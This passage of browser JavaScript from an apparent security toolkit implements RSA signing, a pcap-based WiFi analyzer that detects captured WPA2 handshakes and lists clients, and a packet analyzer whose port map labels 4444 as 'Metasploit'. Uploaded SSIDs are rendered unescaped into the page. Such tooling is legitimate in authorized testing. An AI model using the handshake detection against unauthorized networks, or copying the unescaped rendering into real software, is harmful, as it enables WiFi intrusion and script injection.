    rd.innerHTML='<div style="width:100%"><div class="glass-sm mb-3" style="border-color:rgba(0,255,136,0.25)"><p style="color:var(--accent);font-weight:800;font-size:14px;margin-bottom:4px"><i class="fas fa-check-circle"></i> Real '+keySize+'-bit RSA Keys Generated</p><p style="font-size:10px;color:var(--muted)">Web Crypto API · RSA-OAEP + RSA-PSS · SHA-256</p></div><div class="glass-sm mb-3"><div class="flex justify-between items-center mb-2"><span style="font-size:11px;font-weight:700;color:var(--cyan)">PUBLIC KEY</span><div style="display:flex;gap:4px"><button class="btn btn-secondary btn-sm" id="rsaPubCopy"><i class="fas fa-copy"></i></button><button class="btn btn-secondary btn-sm" id="rsaPubDl"><i class="fas fa-download"></i> .pem</button></div></div><div style="font-family:\'JetBrains Mono\',monospace;font-size:9px;color:var(--muted);word-break:break-all;background:var(--input-bg);padding:8px;border-radius:6px;max-height:80px;overflow-y:auto">'+pubPem.replace(/\n/g,'<br>')+'</div></div><div class="glass-sm mb-3"><div class="flex justify-between items-center mb-2"><span style="font-size:11px;font-weight:700;color:var(--warn)">PRIVATE KEY — Keep Secret</span><div style="display:flex;gap:4px"><button class="btn btn-secondary btn-sm" id="rsaPrivCopy"><i class="fas fa-copy"></i></button><button class="btn btn-secondary btn-sm" id="rsaPrivDl"><i class="fas fa-download"></i> .pem</button></div></div><div style="font-family:\'JetBrains Mono\',monospace;font-size:9px;color:var(--muted);word-break:break-all;background:var(--input-bg);padding:8px;border-radius:6px;max-height:80px;overflow-y:auto">'+privPem.replace(/\n/g,'<br>')+'</div></div></div>';
    document.getElementById('rsaPubCopy').onclick=()=>copyText(getResult(pubK));
    document.getElementById('rsaPrivCopy').onclick=()=>copyText(getResult(privK));
    document.getElementById('rsaPubDl').onclick=()=>downloadText('rsa_public.pem',pubPem);
    document.getElementById('rsaPrivDl').onclick=()=>downloadText('rsa_private.pem',privPem);
    addStats(1);logActivity('RSA: Real '+keySize+'-bit key pair generated');toast('RSA keys generated!','success');
  }catch(e){rd.innerHTML='<p style="color:var(--danger)"><i class="fas fa-circle-xmark"></i> '+esc(e.message)+'</p>';toast('RSA failed: '+e.message,'error');}
  btn.disabled=false;btn.innerHTML='<i class="fas fa-key"></i> Regenerate Keys';
});

$on('rsaSignBtn', 'click',async()=>{
  const txt=document.getElementById('rsaInput').value;if(!txt.trim())return toast('Enter text to sign','warn');if(!rsaSignKeys)return toast('Generate keys first','warn');
  try{
    const encoded=new TextEncoder().encode(txt);
    const sigBuf=await window.crypto.subtle.sign({name:'RSA-PSS',saltLength:32},rsaSignKeys.privateKey,encoded);
    rsaLastSignature=sigBuf;rsaLastSignedText=txt;
    const hex=bufferToHex(sigBuf);const sk=storeResult(hex);
    const sigDiv=document.createElement('div');sigDiv.className='glass-sm mt-2';
    sigDiv.innerHTML='<div class="flex justify-between items-center mb-1"><span style="font-size:11px;font-weight:700;color:var(--purple)"><i class="fas fa-signature"></i> RSA-PSS Signature</span><button class="btn btn-secondary btn-sm" id="rsaSigCopy"><i class="fas fa-copy"></i></button></div><div style="font-family:\'JetBrains Mono\',monospace;font-size:9px;color:var(--muted);word-break:break-all;background:var(--input-bg);padding:8px;border-radius:6px;max-height:80px;overflow-y:auto">'+hex+'</div>';
    document.getElementById('rsaResult').appendChild(sigDiv);
    document.getElementById('rsaSigCopy').onclick=()=>copyText(getResult(sk));
    toast('Signature created!','success');
  }catch(e){toast('Sign failed: '+e.message,'error');}
});

$on('rsaVerifyBtn', 'click',async()=>{
  if(!rsaLastSignature||!rsaSignKeys)return toast('Sign something first','warn');
  const txt=document.getElementById('rsaInput').value;
  try{
    const valid=await window.crypto.subtle.verify({name:'RSA-PSS',saltLength:32},rsaSignKeys.publicKey,rsaLastSignature,new TextEncoder().encode(txt));
    const sameText=txt===rsaLastSignedText;
    const verDiv=document.createElement('div');verDiv.className='glass-sm mt-2';
    verDiv.style.borderColor=valid&&sameText?'rgba(0,255,136,0.3)':'rgba(255,51,102,0.3)';
    verDiv.innerHTML='<p style="font-weight:700;font-size:13px;color:'+(valid&&sameText?'var(--accent)':'var(--danger)')+'"><i class="fas '+(valid&&sameText?'fa-shield-halved':'fa-circle-xmark')+'"></i> Signature '+(valid&&sameText?'VALID ✓':'INVALID ✗')+'</p>';
    document.getElementById('rsaResult').appendChild(verDiv);
    toast(valid&&sameText?'Signature VALID!':'Signature INVALID!',valid&&sameText?'success':'error');
  }catch(e){toast('Verify failed: '+e.message,'error');}
});

$on('clearRsaInputBtn', 'click',()=>{document.getElementById('rsaInput').value='';});
$on('clearRsaResultBtn', 'click',()=>{
  rsaCryptoKeys=null;rsaSignKeys=null;rsaLastSignature=null;rsaLastSignedText=null;
  document.getElementById('rsaResult').innerHTML='<p style="color:var(--muted);opacity:.5;font-size:13px">Generate RSA key pair to begin</p>';
  document.getElementById('rsaSignBtn').disabled=true;document.getElementById('rsaVerifyBtn').disabled=true;
});

// =============================================
// WIFI ANALYZER (full code preserved)
// =============================================
let wifiFileBuffer=null;
try {
$on('clearWifiBtn', 'click',()=>{wifiFileBuffer=null;document.getElementById('wifiFile').value='';document.getElementById('wifiAnalyzeBtn').disabled=true;document.getElementById('wifiResult').innerHTML='<p class="text-sm" style="color:var(--muted);opacity:.5;padding:80px 0;text-align:center">Upload a pcap file or run demo</p>';toast('Cleared','info');});
setupDropZone('wifiDropZone','wifiFile',f=>{if(f.size>MAX_PCAP_MB*1024*1024)return toast('Max '+MAX_PCAP_MB+'MB','error');if(!f.name.match(/\.(pcap|cap)$/i))return toast('.pcap/.cap only','error');const r=new FileReader();r.onload=e=>{wifiFileBuffer=e.target.result;document.getElementById('wifiAnalyzeBtn').disabled=false;toast('Loaded: '+f.name,'info');};r.readAsArrayBuffer(f);});
} catch(e) { console.error('[CyberSuiteX] WiFiAnalyzer wiring error:', e); }
$on('wifiAnalyzeBtn', 'click',()=>{
  if(!wifiFileBuffer)return;
  try{
    const buf=wifiFileBuffer;
    const v=new DataView(buf);
    if(buf.byteLength<24)throw new Error('File too small');
    const magic=v.getUint32(0,false);
    let le=false;
    if(magic===0xd4c3b2a1)le=true;
    else if(magic!==0xa1b2c3d4)throw new Error('Invalid PCAP magic bytes');
    const linkType=v.getUint32(20,le);
    const linkNames={1:'Ethernet (IEEE 802.3)',105:'IEEE 802.11 Raw',119:'Radiotap + 802.11',119:'Radiotap Header',127:'Radiotap Header',113:'Linux Cooked Capture'};
    const linkName=linkNames[linkType]||'Link Type '+linkType;
    let off=24,totalPkts=0,totalBytes=0;
    const firstTs=v.getUint32(24,le),lastTs={s:0,us:0};
    const networks={};   // bssid -> {ssid,bssid,channel,enc,clients,beacons}
    const eapolFrames=[];
    const clientMACs={};
    while(off<=buf.byteLength-16&&totalPkts<50000){
      const tss=v.getUint32(off,le),tsu=v.getUint32(off+4,le),il=v.getUint32(off+8,le);
      lastTs.s=tss;lastTs.us=tsu;off+=16;
      if(off+il>buf.byteLength)break;
      const pkt=new Uint8Array(buf,off,il);
      totalPkts++;totalBytes+=il;
      // Parse 802.11 from Radiotap or raw
      let dot11=null,radiotapLen=0;
      if(linkType===127||linkType===119){
        if(pkt.length>4){radiotapLen=(pkt[2]|(pkt[3]<<8));if(radiotapLen<pkt.length)dot11=pkt.slice(radiotapLen);}
      } else if(linkType===105){dot11=pkt;}
      else if(linkType===1&&pkt.length>14){
        // Ethernet — check for EAPOL (ethertype 0x888E)
        const etype=(pkt[12]<<8)|pkt[13];
        if(etype===0x888E&&pkt.length>18){
          const srcMac=Array.from(pkt.slice(6,12)).map(b=>b.toString(16).padStart(2,'0')).join(':');
          const dstMac=Array.from(pkt.slice(0,6)).map(b=>b.toString(16).padStart(2,'0')).join(':');
          const eapType=pkt[15],keyInfo=(pkt[19]<<8)|pkt[20];
          let msg='Unknown';
          if(eapType===3){const pairwise=!!(keyInfo&0x0008),ack=!!(keyInfo&0x0080),mic=!!(keyInfo&0x0100),install=!!(keyInfo&0x0040),secure=!!(keyInfo&0x0200);if(pairwise&&ack&&!mic)msg='MSG 1';else if(pairwise&&!ack&&mic&&!install)msg='MSG 2';else if(pairwise&&ack&&mic&&install)msg='MSG 3';else if(pairwise&&!ack&&mic&&secure)msg='MSG 4';}
          eapolFrames.push({msg,src:srcMac,dst:dstMac,ts:tss});
        }
      }
      if(dot11&&dot11.length>2){
        const fc=(dot11[0]|(dot11[1]<<8));
        const type=(fc>>2)&0x3,subtype=(fc>>4)&0xF;
        // Beacon frame (type=0, subtype=8)
        if(type===0&&subtype===8&&dot11.length>36){
          const bssid=Array.from(dot11.slice(16,22)).map(b=>b.toString(16).padStart(2,'0')).join(':');
          let ssid='(hidden)',channel=0,enc='Open',i=36;
          while(i<dot11.length-2){
            const eid=dot11[i],elen=dot11[i+1];if(i+2+elen>dot11.length)break;
            if(eid===0){ssid=elen?new TextDecoder().decode(dot11.slice(i+2,i+2+elen)):'(hidden)';}
            else if(eid===3&&elen>=1){channel=dot11[i+2];}
            else if(eid===48)enc='WPA2';
            else if(eid===221){const oui=[dot11[i+2],dot11[i+3],dot11[i+4]];if(oui[0]===0x00&&oui[1]===0x50&&oui[2]===0xf2&&dot11[i+5]===1)enc=enc==='WPA2'?'WPA2':'WPA';}
            i+=2+elen;
          }
          if(!networks[bssid]){networks[bssid]={ssid,bssid,channel,enc,clients:new Set(),beacons:0};}
          const n=networks[bssid];n.beacons++;if(enc!=='Open'&&n.enc==='Open')n.enc=enc;if(channel)n.channel=channel;if(ssid!=='(hidden)')n.ssid=ssid;
        }
        // Data frame — collect client MACs
        if(type===2&&dot11.length>26){
          const toDS=fc&0x0100,fromDS=fc&0x0200;
          let cMac=null;
          if(toDS&&!fromDS)cMac=Array.from(dot11.slice(10,16)).map(b=>b.toString(16).padStart(2,'0')).join(':');
          else if(!toDS&&fromDS)cMac=Array.from(dot11.slice(4,10)).map(b=>b.toString(16).padStart(2,'0')).join(':');
          if(cMac){clientMACs[cMac]=(clientMACs[cMac]||0)+1;}
          // EAPOL inside 802.11
          const llcOff=24;if(dot11.length>llcOff+8&&dot11[llcOff]===0xAA&&dot11[llcOff+1]===0xAA){
            const etype=(dot11[llcOff+6]<<8)|dot11[llcOff+7];
            if(etype===0x888E){
              const ea=dot11.slice(llcOff+8);
              const eapType=ea[1],keyInfo=(ea[5]<<8)|ea[6];
              const srcMac=Array.from(dot11.slice(10,16)).map(b=>b.toString(16).padStart(2,'0')).join(':');
              const dstMac=Array.from(dot11.slice(4,10)).map(b=>b.toString(16).padStart(2,'0')).join(':');
              let msg='Unknown';
              if(eapType===3){const pairwise=!!(keyInfo&0x0008),ack=!!(keyInfo&0x0080),mic=!!(keyInfo&0x0100),install=!!(keyInfo&0x0040),secure=!!(keyInfo&0x0200);if(pairwise&&ack&&!mic)msg='MSG 1';else if(pairwise&&!ack&&mic&&!install)msg='MSG 2';else if(pairwise&&ack&&mic&&install)msg='MSG 3';else if(pairwise&&!ack&&mic&&secure)msg='MSG 4';}
              eapolFrames.push({msg,src:srcMac,dst:dstMac,ts:tss});
            }
          }
        }
      }
      off+=il;
    }
    const duration=lastTs.s>0?((lastTs.s-firstTs)+lastTs.us/1e6).toFixed(2):0;
    const netList=Object.values(networks);
    const hasHandshake=eapolFrames.length>=2;
    const msgs=eapolFrames.map(f=>f.msg);
    const hasAll4=msgs.includes('MSG 1')&&msgs.includes('MSG 2')&&msgs.includes('MSG 3')&&msgs.includes('MSG 4');
    const encBadge=enc=>{if(enc==='WPA2')return'<span style="padding:2px 8px;border-radius:4px;background:rgba(0,255,136,0.12);color:var(--accent);font-size:9px;font-weight:700">WPA2</span>';if(enc==='WPA')return'<span style="padding:2px 8px;border-radius:4px;background:rgba(255,170,0,0.12);color:var(--warn);font-size:9px;font-weight:700">WPA</span>';if(enc==='WEP')return'<span style="padding:2px 8px;border-radius:4px;background:rgba(255,51,102,0.12);color:var(--danger);font-size:9px;font-weight:700">WEP</span>';return'<span style="padding:2px 8px;border-radius:4px;background:rgba(100,116,139,0.12);color:var(--muted);font-size:9px;font-weight:700">Open</span>';};
    const el=document.getElementById('wifiResult');
    const handshakeHtml=eapolFrames.length?`<div class="glass-sm mb-3" style="border-color:${hasAll4?'rgba(0,255,136,0.35)':'rgba(255,170,0,0.35)'}">
      <p style="color:${hasAll4?'var(--accent)':'var(--warn)'};font-weight:800;font-size:13px;margin-bottom:6px"><i class="fas fa-${hasAll4?'shield-halved':'triangle-exclamation'}"></i> ${hasAll4?'Complete 4-Way WPA2 Handshake Captured':'Partial Handshake ('+eapolFrames.length+' EAPOL frames)'}</p>
      <div style="display:flex;flex-direction:column;gap:4px">`+['MSG 1','MSG 2','MSG 3','MSG 4'].map(m=>{const found=eapolFrames.find(f=>f.msg===m);const desc={['MSG 1']:'AP → Client: ANonce',['MSG 2']:'Client → AP: SNonce + MIC',['MSG 3']:'AP → Client: GTK Install',['MSG 4']:'Client → AP: Confirmation'}[m];return`<div style="display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid var(--border);font-size:11px"><span style="padding:2px 8px;border-radius:4px;background:rgba(0,255,136,0.08);color:var(--accent);font-size:9px;font-weight:700;font-family:'JetBrains Mono'">${m}</span><span style="color:var(--muted)">${desc}</span><i class="fas fa-${found?'check':'xmark'}" style="color:var(--${found?'accent':'danger'});margin-left:auto"></i></div>`;}).join('')+`</div></div>`:'<div class="glass-sm mb-3"><p style="color:var(--muted);font-size:11px"><i class="fas fa-circle-info"></i> No EAPOL handshake frames found</p></div>';
    el.innerHTML=`<div style="width:100%">
      <div class="grid grid-cols-4 gap-2 mb-3">`+[['Packets',totalPkts.toLocaleString(),'var(--accent)'],['Duration',duration+'s','var(--cyan)'],['Networks',netList.length,'var(--warn)'],['EAPOLs',eapolFrames.length,'var(--danger)']].map(([l,v,c])=>`<div class="glass-sm text-center"><div style="font-size:16px;font-weight:800;color:${c};font-family:'JetBrains Mono'">${v}</div><div style="font-size:10px;color:var(--muted)">${l}</div></div>`).join('')+`</div>
      <div class="glass-sm mb-3"><p style="font-size:10px;color:var(--muted);margin-bottom:4px">Link Type: <span style="color:var(--cyan)">${linkName}</span> &nbsp;·&nbsp; Total bytes: <span style="color:var(--cyan)">${(totalBytes/1024).toFixed(1)} KB</span></p></div>
      ${handshakeHtml}
      ${netList.length?`<div class="glass-sm mb-3"><p style="font-size:10px;font-weight:700;color:var(--muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px">Discovered Networks</p><div style="display:flex;flex-direction:column;gap:6px">`+netList.map(n=>`<div style="display:flex;align-items:center;gap:8px;padding:7px 0;border-bottom:1px solid var(--border)"><div style="flex:1;min-width:0"><p style="font-size:12px;font-weight:700;color:var(--text);margin:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${n.ssid}</p><p style="font-size:10px;color:var(--muted);margin:2px 0 0;font-family:'JetBrains Mono'">${n.bssid}</p></div><div style="display:flex;align-items:center;gap:6px;flex-shrink:0">${n.channel?`<span style="font-size:9px;padding:2px 7px;border-radius:4px;background:rgba(0,212,255,0.1);color:var(--cyan)">CH ${n.channel}</span>`:''}${encBadge(n.enc)}<span style="font-size:9px;color:var(--muted)">${n.beacons} beacons</span></div></div>`).join('')+'</div></div>':''}
      ${Object.keys(clientMACs).length?`<div class="glass-sm mb-3"><p style="font-size:10px;font-weight:700;color:var(--muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px">Active Clients (${Object.keys(clientMACs).length})</p><div style="overflow-x:auto"><table class="data-table" style="width:100%"><thead><tr><th>MAC Address</th><th>Frames</th></tr></thead><tbody>`+Object.entries(clientMACs).sort((a,b)=>b[1]-a[1]).slice(0,20).map(([mac,cnt])=>`<tr><td style="font-family:'JetBrains Mono';font-size:11px">${mac}</td><td style="color:var(--cyan)">${cnt}</td></tr>`).join('')+'</tbody></table></div></div>':''}
      <div class="disclaimer"><i class="fas fa-triangle-exclamation"></i><span>For authorized security testing only. Analyzing captures on unauthorized networks is illegal.</span></div>
    </div>`;
    logActivity('WiFi: Parsed '+totalPkts+' packets, '+netList.length+' networks, '+eapolFrames.length+' EAPOL frames');
    toast('Analysis complete!','success');
  }catch(e){toast('Parse error: '+e.message,'error');}
});
$on('wifiDemoBtn', 'click',()=>{
  const el=document.getElementById('wifiResult');
  el.innerHTML='<div style="width:100%"><div class="glass-sm mb-3" style="border-color:rgba(0,255,136,0.3)"><p style="color:var(--accent);font-weight:800;font-size:14px"><i class="fas fa-circle-check"></i> Complete 4-Way WPA2 Handshake</p><p style="font-size:10px;color:var(--muted)">DEMO — HomeNetwork-5G · BSSID a4:cf:12:b3:56:78</p></div><div class="grid grid-cols-4 gap-2 mb-3">'+[['Packets','6,843','var(--accent)'],['Duration','42.8s','var(--cyan)'],['SSIDs','2','var(--warn)'],['EAPOLs','4','var(--danger)']].map(([l,v,c])=>'<div class="glass-sm text-center"><div style="font-size:16px;font-weight:800;color:'+c+';font-family:\'JetBrains Mono\'">'+v+'</div><div style="font-size:10px;color:var(--muted)">'+l+'</div></div>').join('')+'</div><div class="glass-sm mb-3"><p style="font-size:10px;font-weight:700;color:var(--muted);margin-bottom:8px">EAPOL MESSAGES</p>'+[1,2,3,4].map(n=>'<div style="display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--border);font-size:11px"><span style="padding:2px 8px;border-radius:4px;background:rgba(0,255,136,0.1);color:var(--accent);font-family:\'JetBrains Mono\';font-size:9px">MSG '+n+'</span><span style="color:var(--muted)">'+(n===1?'AP → Client: ANonce':n===2?'Client → AP: SNonce + MIC':n===3?'AP → Client: GTK Install':'Client → AP: Confirmation')+'</span><i class="fas fa-check" style="color:var(--accent);margin-left:auto"></i></div>').join('')+'</div><div class="disclaimer"><i class="fas fa-triangle-exclamation"></i><span>For authorized security testing only. Cracking WPA on unauthorized networks is illegal.</span></div></div>';
  logActivity('WiFi: Demo — WPA2 handshake shown');toast('Demo loaded!','info');
});

// =============================================
// PACKET ANALYZER
// =============================================
let packetData=[],packetFileBuffer=null,activeProtoFilter='all',activeFlagFilter='any';
const PROTOCOLS={6:'TCP',17:'UDP',1:'ICMP',2:'IGMP',89:'OSPF'};
const PORT_MAP={80:'HTTP',443:'HTTPS',8080:'HTTP-ALT',21:'FTP',22:'SSH',23:'TELNET',25:'SMTP',53:'DNS',110:'POP3',143:'IMAP',3306:'MySQL',5432:'Postgres',6379:'Redis',3389:'RDP',4444:'Metasploit',9200:'Elasticsearch'};
const getService=p=>PORT_MAP[p]||null;
const isTLS=p=>p.dstPort===443||p.srcPort===443;
const isHTTP=p=>p.dstPort===80||p.srcPort===80||p.dstPort===8080||p.srcPort===8080;
const isDNS=p=>p.dstPort===53||p.srcPort===53;
const isFTP=p=>p.dstPort===21||p.srcPort===21;
const isSMTP=p=>p.dstPort===25||p.srcPort===25;
const isSSH=p=>p.dstPort===22||p.srcPort===22;

{const c=$(  'protoPills');if(c)c.querySelectorAll('.filter-pill').forEach(pill=>{pill.addEventListener('click',()=>{c.querySelectorAll('.filter-pill').forEach(p=>p.classList.remove('active'));pill.classList.add('active');activeProtoFilter=pill.dataset.proto;filterPacketTable();});});}
{const c=$('flagPills');if(c)c.querySelectorAll('.filter-pill').forEach(pill=>{pill.addEventListener('click',()=>{c.querySelectorAll('.filter-pill').forEach(p=>p.classList.remove('active'));pill.classList.add('active');activeFlagFilter=pill.dataset.flag;filterPacketTable();});});}
['filterSrcIP','filterDstIP','filterPort','filterMinSize','packetSearch'].forEach(id=>{const el=$(id);if(el)el.addEventListener('input',debounce(filterPacketTable,150));});
$on('packetStatsToggle', 'click',function(){this.classList.toggle('active');const show=this.classList.contains('active');document.getElementById('packetStatsPanel').style.display=show&&packetData.length?'block':'none';if(show&&packetData.length)renderPacketStats();});

function portMatchesFilter(pkt,portStr){if(!portStr.trim())return true;if(portStr.includes(','))return portStr.split(',').some(p=>portMatchesFilter(pkt,p.trim()));if(portStr.includes('-')){const[a,b]=portStr.split('-').map(Number);return(pkt.srcPort>=a&&pkt.srcPort<=b)||(pkt.dstPort>=a&&pkt.dstPort<=b);}const p=parseInt(portStr);return pkt.srcPort===p||pkt.dstPort===p;}

$on('clearPacketBtn', 'click',()=>{packetData=[];packetFileBuffer=null;['packetFile','packetSearch','filterSrcIP','filterDstIP','filterPort','filterMinSize'].forEach(id=>{const el=document.getElementById(id);if(el)el.value='';});document.getElementById('packetAnalyzeBtn').disabled=true;document.getElementById('packetExportBtn').disabled=true;clearPacketResult();toast('Cleared','info');});
$on('clearPacketResultBtn', 'click',clearPacketResult);
function clearPacketResult(){document.getElementById('packetResult').innerHTML='<p class="text-sm" style="color:var(--muted);opacity:.5;padding:80px 0;text-align:center">Upload a pcap or run demo</p>';document.getElementById('packetStatsPanel').style.display='none';}

function parsePacketsPCAP(buf){
  const v=new DataView(buf);if(buf.byteLength<24)throw new Error('Too small');
  const magic=v.getUint32(0,false);let le=false;
  if(magic===0xd4c3b2a1)le=true;else if(magic!==0xa1b2c3d4)throw new Error('Invalid PCAP');
  const net=v.getUint32(20,le);let off=24;const pkts=[];let pid=1;
  while(off<=buf.byteLength-16&&pkts.length<2000){
    const tss=v.getUint32(off,le),tsu=v.getUint32(off+4,le),il=v.getUint32(off+8,le);off+=16;
    if(off+il>buf.byteLength)break;
    const pkt=new Uint8Array(buf,off,il);
    let srcIP='N/A',dstIP='N/A',proto='Unknown',srcPort=null,dstPort=null,payload='',flags=[],ttl=null;
    if((net===1||net===113)&&pkt.length>34){
      const ethOff=net===113?16:14;
      if(pkt[ethOff]===0x45){
        ttl=pkt[ethOff+8];srcIP=pkt.slice(ethOff+12,ethOff+16).join('.');dstIP=pkt.slice(ethOff+16,ethOff+20).join('.');
        const pr=pkt[ethOff+9];proto=PROTOCOLS[pr]||'IP('+pr+')';
        const ipHl=(pkt[ethOff]&0xF)*4,tOff=ethOff+ipHl;
        if(pr===6&&tOff+20<=pkt.length){
          srcPort=(pkt[tOff]<<8)|pkt[tOff+1];dstPort=(pkt[tOff+2]<<8)|pkt[tOff+3];
          const fb=pkt[tOff+13];if(fb&0x02)flags.push('SYN');if(fb&0x10)flags.push('ACK');if(fb&0x01)flags.push('FIN');if(fb&0x04)flags.push('RST');if(fb&0x08)flags.push('PSH');if(fb&0x20)flags.push('URG');
          const pp={srcPort,dstPort};if(isHTTP(pp))proto='HTTP';else if(isTLS(pp))proto='TLS/HTTPS';else if(isFTP(pp))proto='FTP';else if(isSSH(pp))proto='SSH';else if(isSMTP(pp))proto='SMTP';
          const dOff=tOff+((pkt[tOff+12]>>4)*4),dLen=Math.min(48,pkt.length-dOff);
          if(dLen>0)payload=Array.from(pkt.slice(dOff,dOff+dLen)).map(b=>b>=32&&b<127?String.fromCharCode(b):'.').join('');
        }else if(pr===17&&tOff+4<=pkt.length){
          srcPort=(pkt[tOff]<<8)|pkt[tOff+1];dstPort=(pkt[tOff+2]<<8)|pkt[tOff+3];
          const pp={srcPort,dstPort};if(isDNS(pp))proto='DNS';
          const dOff=tOff+8,dLen=Math.min(48,pkt.length-dOff);
          if(dLen>0)payload=Array.from(pkt.slice(dOff,dOff+dLen)).map(b=>b>=32&&b<127?String.fromCharCode(b):'.').join('');
        }else if(pr===1&&tOff+4<=pkt.length){proto='ICMP';const icmpTypes={0:'Echo Reply',3:'Unreachable',8:'Echo Request',11:'Time Exceeded'};payload=icmpTypes[pkt[tOff]]||'Type '+pkt[tOff];}
      }
    }
    const service=srcPort||dstPort?getService(dstPort)||getService(srcPort):null;
    pkts.push({id:pid++,time:tss+'.'+String(tsu).padStart(6,'0'),srcIP,dstIP,proto,srcPort,dstPort,payload,flags,ttl,length:il,service});
    off+=il;
  }
  return pkts;
}

function renderPacketStats(){
  const protoCount={};packetData.forEach(p=>{protoCount[p.proto]=(protoCount[p.proto]||0)+1;});
  const topProtos=Object.entries(protoCount).sort((a,b)=>b[1]-a[1]).slice(0,6);
  const totalBytes=packetData.reduce((s,p)=>s+p.length,0);
  const flagCount={SYN:0,ACK:0,FIN:0,RST:0};packetData.forEach(p=>p.flags.forEach(f=>{if(f in flagCount)flagCount[f]++;}));
  document.getElementById('packetStatsPanel').innerHTML='<div><p style="font-size:10px;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Stats</p><div class="grid grid-cols-2 gap-2 mb-3">'+[['Total Pkts',packetData.length,'var(--accent)'],['Total Bytes',totalBytes>=1024?(totalBytes/1024).toFixed(1)+'KB':totalBytes+'B','var(--cyan)']].map(([l,v,c])=>'<div style="text-align:center;padding:8px;background:var(--input-bg);border-radius:7px"><div style="font-size:14px;font-weight:800;color:'+c+';font-family:\'JetBrains Mono\'">'+v+'</div><div style="font-size:9px;color:var(--muted)">'+l+'</div></div>').join('')+'</div><div style="display:flex;flex-wrap:wrap;gap:4px">'+topProtos.map(([p,c])=>'<span style="font-size:10px;padding:2px 8px;border-radius:4px;background:rgba(0,255,136,0.08);color:var(--accent);border:1px solid var(--border);font-family:\'JetBrains Mono\'">'+p+': '+c+'</span>').join('')+'</div></div>';
}

function filterPacketTable(){
  const srcIPF=document.getElementById('filterSrcIP').value.trim();
  const dstIPF=document.getElementById('filterDstIP').value.trim();
  const portF=document.getElementById('filterPort').value.trim();
  const minSizeF=parseInt(document.getElementById('filterMinSize').value)||0;
  const search=document.getElementById('packetSearch').value.toLowerCase().trim();
  let filtered=packetData;
  if(activeProtoFilter!=='all'){filtered=filtered.filter(p=>{const proto=p.proto.toLowerCase();if(activeProtoFilter==='tcp')return proto==='tcp';if(activeProtoFilter==='udp')return proto==='udp';if(activeProtoFilter==='icmp')return proto==='icmp';if(activeProtoFilter==='http')return proto==='http';if(activeProtoFilter==='https')return proto==='tls/https'||proto==='https';if(activeProtoFilter==='dns')return proto==='dns';if(activeProtoFilter==='tls')return proto.includes('tls');if(activeProtoFilter==='arp')return proto==='arp';if(activeProtoFilter==='ftp')return proto==='ftp';if(activeProtoFilter==='smtp')return proto==='smtp';if(activeProtoFilter==='ssh')return proto==='ssh';return true;});}
  if(activeFlagFilter!=='any'){const reqFlags=activeFlagFilter.split('+');filtered=filtered.filter(p=>reqFlags.every(f=>p.flags.includes(f)));}
  if(srcIPF)filtered=filtered.filter(p=>p.srcIP.includes(srcIPF));
  if(dstIPF)filtered=filtered.filter(p=>p.dstIP.includes(dstIPF));
  if(portF)filtered=filtered.filter(p=>portMatchesFilter(p,portF));
  if(minSizeF>0)filtered=filtered.filter(p=>p.length>=minSizeF);
  if(search)filtered=filtered.filter(p=>p.srcIP.includes(search)||p.dstIP.includes(search)||p.payload.toLowerCase().includes(search)||p.proto.toLowerCase().includes(search)||(p.srcPort&&p.srcPort.toString().includes(search))||(p.dstPort&&p.dstPort.toString().includes(search)));
  document.getElementById('packetResultLabel').textContent='Packet Table ('+filtered.length+'/'+packetData.length+')';
  renderPacketTable(filtered);
}

const protoColors={'TCP':'background:rgba(0,212,255,0.12);color:var(--cyan)','UDP':'background:rgba(0,255,136,0.1);color:var(--accent)','ICMP':'background:rgba(255,170,0,0.1);color:var(--warn)','HTTP':'background:rgba(168,85,247,0.1);color:var(--purple)','TLS/HTTPS':'background:rgba(0,255,136,0.1);color:var(--accent)','DNS':'background:rgba(255,170,0,0.12);color:var(--warn)','FTP':'background:rgba(255,51,102,0.1);color:var(--danger)','SSH':'background:rgba(0,212,255,0.1);color:var(--cyan)','SMTP':'background:rgba(255,170,0,0.1);color:var(--warn)','ARP':'background:rgba(168,85,247,0.1);color:var(--purple)'};

function renderPacketTable(pkts){
  if(!pkts.length){document.getElementById('packetResult').innerHTML='<p style="color:var(--muted);text-align:center;padding:40px">No packets match filter</p>';return;}
  const el=document.getElementById('packetResult');el.style.display='';el.style.alignItems='flex-start';
  el.innerHTML='<div style="width:100%"><div style="overflow-x:auto"><table class="data-table" style="width:100%;min-width:680px"><thead><tr><th>#</th><th>Time</th><th>Src</th><th>Dst</th><th>Proto</th><th>Flags</th><th>Len</th><th>Payload</th></tr></thead><tbody>'+pkts.slice(0,300).map(p=>{const ps=protoColors[p.proto]||'background:rgba(100,116,139,0.1);color:var(--muted)';const flagStr=p.flags.length?p.flags.map(f=>'<span style="font-size:8px;padding:1px 4px;border-radius:3px;background:rgba(255,51,102,0.08);color:var(--danger);margin-right:2px">'+f+'</span>').join(''):'';const srcStr=p.srcPort?p.srcIP+'<span style="color:var(--cyan)">:'+p.srcPort+'</span>':p.srcIP;const dstStr=p.dstPort?p.dstIP+'<span style="color:var(--cyan)">:'+p.dstPort+'</span>':p.dstIP;const svcBadge=p.service?'<span style="font-size:8px;padding:1px 5px;border-radius:3px;background:rgba(168,85,247,0.08);color:var(--purple);margin-left:4px">'+p.service+'</span>':'';return'<tr><td style="color:var(--muted)">'+p.id+'</td><td style="font-size:10px">'+p.time.slice(-10)+'</td><td style="color:var(--text);font-size:10px">'+srcStr+'</td><td style="color:var(--text);font-size:10px">'+dstStr+svcBadge+'</td><td><span class="protocol" style="'+ps+'">'+p.proto+'</span></td><td>'+(flagStr||'–')+'</td><td style="color:var(--muted)">'+p.length+'</td><td style="color:var(--muted);font-family:\'JetBrains Mono\',monospace;font-size:10px;max-width:140px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis">'+( p.payload||'–')+'</td></tr>';}).join('')+'</tbody></table></div>'+(pkts.length>300?'<p style="color:var(--muted);font-size:10px;margin-top:6px">Showing 300/'+pkts.length+'</p>':'')+'</div>';
}

setupDropZone('packetDropZone','packetFile',f=>{if(!f.name.match(/\.(pcap|cap)$/i))return toast('.pcap/.cap only','error');const r=new FileReader();r.onload=e=>{packetFileBuffer=e.target.result;document.getElementById('packetAnalyzeBtn').disabled=false;toast('Loaded: '+f.name,'info');};r.readAsArrayBuffer(f);});
